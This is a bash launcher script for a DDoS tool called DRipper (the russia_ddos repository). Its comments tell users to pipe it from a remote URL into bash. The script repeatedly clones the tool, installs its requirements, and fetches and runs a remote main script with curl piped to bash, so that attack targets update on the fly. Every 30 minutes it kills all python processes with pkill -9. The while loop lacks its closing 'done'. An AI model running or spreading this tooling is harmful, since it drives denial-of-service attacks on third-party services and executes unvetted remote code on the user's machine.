##### This script will start and manage DRipper_main script
##### Advantages of launching DRipper_main not directly but via this script is DRipper_main can be modified on the fly,
##### and all code updates, including list of targets will update automatically on the fly without restarting script.

##### Use next command in local linux terminal to run this script. #####
# >>>     curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_init | bash    <<<


#!/bin/bash
restart_time=1800

# Install git
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi


while true
   do
   
   # Install latest version of DDripper
   cd ~
   git clone https://github.com/alexmon1989/russia_ddos.git
   cd russia_ddos
   pip install -r requirements.txt

   # Run main script
   curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_main | bash

   # Restart DRipper_main after restart_time seconds
   sleep $restart_time
   pkill -9 python; pkill -9 python3





#kill_list=`ps -aux | grep DRipper.py | grep -v grep | awk '{ print $2 }'`
#for i in kill_list
#do
#pkill $i
#done
#killall `ps -aux | grep DRipper.py | grep -v grep | awk '{ print $2 }'` && killall inotifywait
